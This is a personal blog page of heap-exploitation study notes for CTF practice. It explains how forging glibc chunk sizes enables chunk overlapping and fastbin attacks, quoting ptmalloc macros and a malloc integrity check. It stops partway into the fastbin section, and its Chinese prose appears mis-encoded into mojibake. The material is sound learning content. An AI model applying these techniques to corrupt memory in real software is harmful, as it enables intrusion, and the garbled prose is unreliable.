<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Ev3r"><meta name="copyright" content="Ev3r"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>å †çŸ¥è¯†--æŒç»­ | Ev3r's blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"Ev3r","version":"1.5.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æƒ³è¦æœä»€ä¹ˆï¼Œæ¥è¿™é‡Œ","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=UA-121354150-1"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-121354150-1');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="å †æºç çš„çŸ¥è¯†æ€»æ˜¯çœ‹ä¸€ç‚¹å¿˜ä¸€ç‚¹ï¼Œå¯¼è‡´å †çš„å­¦ä¹ éå¸¸ç¼“æ…¢ã€‚è¿™é‡Œæˆ‘è¿˜æ˜¯å¼€ä¸ªæ–‡ç« è®°å½•ä¸€ä¸‹ï¼Œå †æºç çš„çŸ¥è¯†å§ã€‚ Chunk Extend and Overlappingè¿™æ˜¯ä¸€ç§é€šè¿‡æ”¹å˜chunk headæ¥è¾¾åˆ°ä¼ªé€ chunkå¤§å°ï¼Œä»è€ŒæŠŠç”¨æˆ·åŒºç”³è¯·åˆ°ç›¸é‚»çš„chunkä¸Šå»ï¼Œè¾¾åˆ°æº¢å‡ºä¿®æ”¹å…¶ä»–chunkçš„ç›®çš„ã€‚ ä¸»è¦åˆ©ç”¨çš„ptmallocæœºåˆ¶å¦‚ä¸‹ã€‚  å¯»æ‰¾ä¸‹ä¸€ä¸ªchunkçš„æœºåˆ¶ï¼ˆä¸‹ä¸€ä¸ªæŒ‡é«˜åœ°å€ï¼‰  ptmallocæœº">
<meta property="og:type" content="article">
<meta property="og:title" content="å †çŸ¥è¯†--æŒç»­">
<meta property="og:url" content="http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/index.html">
<meta property="og:site_name" content="Ev3r&#39;s blog">
<meta property="og:description" content="å †æºç çš„çŸ¥è¯†æ€»æ˜¯çœ‹ä¸€ç‚¹å¿˜ä¸€ç‚¹ï¼Œå¯¼è‡´å †çš„å­¦ä¹ éå¸¸ç¼“æ…¢ã€‚è¿™é‡Œæˆ‘è¿˜æ˜¯å¼€ä¸ªæ–‡ç« è®°å½•ä¸€ä¸‹ï¼Œå †æºç çš„çŸ¥è¯†å§ã€‚ Chunk Extend and Overlappingè¿™æ˜¯ä¸€ç§é€šè¿‡æ”¹å˜chunk headæ¥è¾¾åˆ°ä¼ªé€ chunkå¤§å°ï¼Œä»è€ŒæŠŠç”¨æˆ·åŒºç”³è¯·åˆ°ç›¸é‚»çš„chunkä¸Šå»ï¼Œè¾¾åˆ°æº¢å‡ºä¿®æ”¹å…¶ä»–chunkçš„ç›®çš„ã€‚ ä¸»è¦åˆ©ç”¨çš„ptmallocæœºåˆ¶å¦‚ä¸‹ã€‚  å¯»æ‰¾ä¸‹ä¸€ä¸ªchunkçš„æœºåˆ¶ï¼ˆä¸‹ä¸€ä¸ªæŒ‡é«˜åœ°å€ï¼‰  ptmallocæœº">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.bmp.ovh/imgs/2021/05/6614988d4c0429fe.png">
<meta property="og:image" content="https://i.loli.net/2021/04/25/TJmHMPc46jQSXx8.png">
<meta property="article:published_time" content="2021-05-13T03:13:20.000Z">
<meta property="article:modified_time" content="2021-05-31T12:52:31.746Z">
<meta property="article:author" content="Ev3r">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.bmp.ovh/imgs/2021/05/6614988d4c0429fe.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Ev3r"><img width="96" loading="lazy" src="/images/head.jpg" alt="Ev3r"><span class="site-author-status" title="nothing for pwn">ğŸ™‚</span></a><div class="site-author-name"><a href="/about/">Ev3r</a></div><span class="site-name">Ev3r's blog</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="æˆ‘çš„ä¸»é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">69</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">35</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/myenid?tab=repositories" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://ctf-wiki.org/pwn/readme/" title="Wiki" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/504533786" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" target="_blank" rel="noopener" href="https://mlysoft.cn/cross.html" title="jså¸ˆå‚…" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chunk-Extend-and-Overlapping"><span class="toc-number">1.</span> <span class="toc-text">Chunk Extend and Overlapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">2.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">3.</span> <span class="toc-text">tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin"><span class="toc-number">4.</span> <span class="toc-text">unsorted bin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">4.1.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">ç‰¹æ®Šåˆ©ç”¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">tcache ç®¡ç†å™¨çš„åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#glibc-2-32%E4%B8%8B%E7%9A%84-tcache-put-%E4%B8%8E-tcache-get"><span class="toc-number">5.0.1.</span> <span class="toc-text">glibc 2.32ä¸‹çš„ tcache_put ä¸ tcache_get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-heap-base"><span class="toc-number">5.0.2.</span> <span class="toc-text">leak heap_base</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache%E4%BB%8E0%E5%88%B01"><span class="toc-number">5.1.</span> <span class="toc-text">tcacheä»0åˆ°1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smallbin%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">smallbinçš„åˆ©ç”¨</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E4%B8%8A%E7%9A%84orw"><span class="toc-number">6.</span> <span class="toc-text">å †ä¸Šçš„orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc-gt-2-29"><span class="toc-number">6.1.</span> <span class="toc-text">glibc&gt;2.29</span></a></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/BJDCTF-2nd%E5%A4%8D%E7%8E%B0/" style="font-size: 21px; color: #4d89c0">BJDCTF 2ndå¤ç°</a> <a href="/tags/IO-FILE/" style="font-size: 12px; color: #999">IO_FILE</a> <a href="/tags/Linux/" style="font-size: 21px; color: #4d89c0">Linux</a> <a href="/tags/Nep2021/" style="font-size: 12px; color: #999">Nep2021</a> <a href="/tags/SROP/" style="font-size: 25.5px; color: #2680d4">SROP</a> <a href="/tags/UAF/" style="font-size: 30px; color: #0078e7">UAF</a> <a href="/tags/VNCTF2021/" style="font-size: 12px; color: #999">VNCTF2021</a> <a href="/tags/ciscn2021/" style="font-size: 12px; color: #999">ciscn2021</a> <a href="/tags/debug/" style="font-size: 12px; color: #999">debug</a> <a href="/tags/double-free/" style="font-size: 12px; color: #999">double_free</a> <a href="/tags/fastbin/" style="font-size: 12px; color: #999">fastbin</a> <a href="/tags/fastbin-attack/" style="font-size: 12px; color: #999">fastbin-attack</a> <a href="/tags/libc%E6%B3%84%E9%9C%B2/" style="font-size: 16.5px; color: #7391ad">libcæ³„éœ²</a> <a href="/tags/off-by-one%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/" style="font-size: 12px; color: #999">off_by_oneåŸç†å’Œåˆ©ç”¨</a> <a href="/tags/orw%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" style="font-size: 12px; color: #999">orwç³»ç»Ÿè°ƒç”¨</a> <a href="/tags/overflow/" style="font-size: 12px; color: #999">overflow</a> <a href="/tags/overlapping/" style="font-size: 12px; color: #999">overlapping</a> <a href="/tags/reverse/" style="font-size: 12px; color: #999">reverse</a> <a href="/tags/shell/" style="font-size: 12px; color: #999">shell</a> <a href="/tags/shellcode/" style="font-size: 25.5px; color: #2680d4">shellcode</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Ev3r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ev3r's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">å †çŸ¥è¯†--æŒç»­<a class="post-edit-link" href="https://github.com/myenid/myenid.github.io_posts/å †çŸ¥è¯†-æŒç»­.md" target="_blank" title="ç¼–è¾‘" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-05-13 11:13:20" itemprop="dateCreated datePublished" datetime="2021-05-13T11:13:20+08:00">2021-05-13</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-05-31 20:52:31" itemprop="dateModified" datetime="2021-05-31T20:52:31+08:00">2021-05-31</time></div><span class="leancloud_visitors" id="/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/" data-flag-title="å †çŸ¥è¯†--æŒç»­"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="è¯„è®ºæ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-chat-3-line"></use></svg> <span class="waline-comment-count" id="/2021/05/13/%E5%A0%86%E7%9F%A5%E8%AF%86-%E6%8C%81%E7%BB%AD/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E5%9F%BA%E7%A1%80/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">åŸºç¡€</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/Linux/" style="--text-color:#2577b1"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Linux</span></a></span></div><div class="post-author"><span class="author-name">Ev3r</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p> å †æºç çš„çŸ¥è¯†æ€»æ˜¯çœ‹ä¸€ç‚¹å¿˜ä¸€ç‚¹ï¼Œå¯¼è‡´å †çš„å­¦ä¹ éå¸¸ç¼“æ…¢ã€‚è¿™é‡Œæˆ‘è¿˜æ˜¯å¼€ä¸ªæ–‡ç« è®°å½•ä¸€ä¸‹ï¼Œå †æºç çš„çŸ¥è¯†å§ã€‚</p>
<h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><p>è¿™æ˜¯ä¸€ç§é€šè¿‡æ”¹å˜chunk headæ¥è¾¾åˆ°ä¼ªé€ chunkå¤§å°ï¼Œä»è€ŒæŠŠç”¨æˆ·åŒºç”³è¯·åˆ°ç›¸é‚»çš„chunkä¸Šå»ï¼Œè¾¾åˆ°æº¢å‡ºä¿®æ”¹å…¶ä»–chunkçš„ç›®çš„ã€‚</p>
<p>ä¸»è¦åˆ©ç”¨çš„ptmallocæœºåˆ¶å¦‚ä¸‹ã€‚</p>
<ul>
<li>å¯»æ‰¾ä¸‹ä¸€ä¸ªchunkçš„æœºåˆ¶ï¼ˆä¸‹ä¸€ä¸ªæŒ‡é«˜åœ°å€ï¼‰</li>
</ul>
<p>ptmallocæœºåˆ¶é€šè¿‡å½“å‰chunkæŒ‡é’ˆåŠ ä¸Šå½“å‰chunkå¤§å°æ¥è·å–ä¸‹ä¸€ä¸ªchunkçš„æŒ‡é’ˆã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Ptr to next physical malloc_chunk. */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">next_chunk</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è€Œè·å–chunkå¤§å°åˆ™æ˜¯å¦‚ä¸‹</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Get size, ignoring use bits */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunksize</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>SIZE_BITS<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunksize_nomask</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-></span>mchunk_size<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸€ç§æ˜¯ç›´æ¥è·å– chunk çš„å¤§å°ï¼Œä¸å¿½ç•¥æ©ç éƒ¨åˆ†ï¼Œå¦å¤–ä¸€ç§æ˜¯å¿½ç•¥æ©ç éƒ¨åˆ†ã€‚</p>
<p>æ‰€ä»¥åªè¦æˆ‘ä»¬æ”¹æ‰sizeä½å°±å¯ä»¥ä¼ªé€ å½“å‰chunkçš„sizeï¼Œä»è€Œå¯¹ä¸‹ä¸€ä¸ªchunkéæ³•ç”³è¯·ã€‚</p>
<p>åœ¨ ptmalloc ä¸­ï¼Œè·å–å‰ä¸€ä¸ª chunk ä¿¡æ¯çš„æ“ä½œå¦‚ä¸‹ </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">prev_size</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-></span>mchunk_prev_size<span class="token punctuation">)</span></span></span>

<span class="token comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">prev_chunk</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">prev_size</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> å³é€šè¿‡ malloc_chunk-&gt;prev_size è·å–å‰ä¸€å—å¤§å°ï¼Œç„¶åä½¿ç”¨æœ¬ chunk åœ°å€å‡å»æ‰€å¾—å¤§å°ã€‚</p>
<p>åœ¨ ptmallocï¼Œåˆ¤æ–­å½“å‰ chunk æ˜¯å¦æ˜¯ use çŠ¶æ€çš„æ“ä½œå¦‚ä¸‹ï¼š </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">inuse</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span>mchunk_size<span class="token punctuation">)</span> <span class="token operator">&amp;</span> PREV_INUSE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> å³æŸ¥çœ‹ä¸‹ä¸€ <code>chunk</code> çš„ <code>prev_inuse</code> åŸŸï¼Œè€Œä¸‹ä¸€å—åœ°å€åˆå¦‚æˆ‘ä»¬å‰é¢æ‰€è¿°æ˜¯æ ¹æ®å½“å‰ chunk çš„ size è®¡ç®—å¾—å‡ºçš„ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¼ªé€ <code>size</code> ç„¶åæŠŠ<code>chunk</code> <code>free</code>ä¹‹åï¼Œè®¡ç®—å‡ºæ¥çš„ä¸‹ä¸€ä¸ªchunkï¼Œå®é™…ä¸Šå°±æ˜¯æ›´å…·ä¼ªé€ çš„<code>size</code>è®¡ç®—å‡ºæ¥çš„ã€‚</p>
<p>åˆ©ç”¨å¦‚ä¸Šå‡ ç‚¹å¯ä»¥è¿›è¡Œextend å’Œ overlapping</p>
<p><strong>æ€»çš„æ¥è¯´ï¼Œå¯ä»¥ä¿®æ”¹fdé€ æˆfastbin attack ä¹Ÿå¯ä»¥unsorted binæ³„éœ²</strong>ä¸»è¦æ˜¯overlappingä¹‹åï¼ŒåŸæŒ‡é’ˆä¹Ÿå¯ä»¥æ“ä½œchunkã€‚</p>
<p>æœ‰æº¢å‡ºå°±å¯ä»¥ç”¨è¿™ä¸ªoverlapï¼Œä¿®æ”¹chunkæŒ‡é’ˆï¼Œå¯¼è‡´ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªchunk</p>
<h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>åˆ©ç”¨ç‚¹åœ¨äº<code>fastbin</code>çš„ç®¡ç†æœºåˆ¶ï¼Œ</p>
<p>é¦–å…ˆï¼Œfastbinçš„pre_inuseä½æ°¸è¿œæ˜¯1ï¼Œè¿™ä¿è¯äº†fastbinä¸ä¼šå‘ç”Ÿåˆå¹¶</p>
<p>è€Œä¸”ï¼Œfastbin freeåæ˜¯é fdæŒ‡é’ˆé“¾æ¥åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥å…ˆè¿›å»çš„åœ¨å‰é¢ï¼Œä¹Ÿå°±æ˜¯é“¾è¡¨å°¾ï¼Œé‚£ä¹ˆéå†fasbinçš„æ—¶å€™ï¼Œå°±æ˜¯ä»æœ€åä¸€ä¸ªè¿›å»çš„chunkå¼€å§‹éå†çš„ï¼Œ</p>
<p>æ‰€ä»¥fastbin å…ˆè¿›åå‡ºã€‚</p>
<p><strong>æ­¤å¤–</strong>ï¼Œ_int_malloc ä¼šå¯¹æ¬²åˆ†é…ä½ç½®çš„ size åŸŸè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœå…¶ size ä¸å½“å‰ fastbin é“¾è¡¨åº”æœ‰ size ä¸ç¬¦å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>_int_malloc ä¸­çš„æ ¡éªŒå¦‚ä¸‹ </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>
    errout<span class="token operator">:</span>
      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>index</strong>ï¼Œçœ‹fastbinçš„ç»“æ„</p>
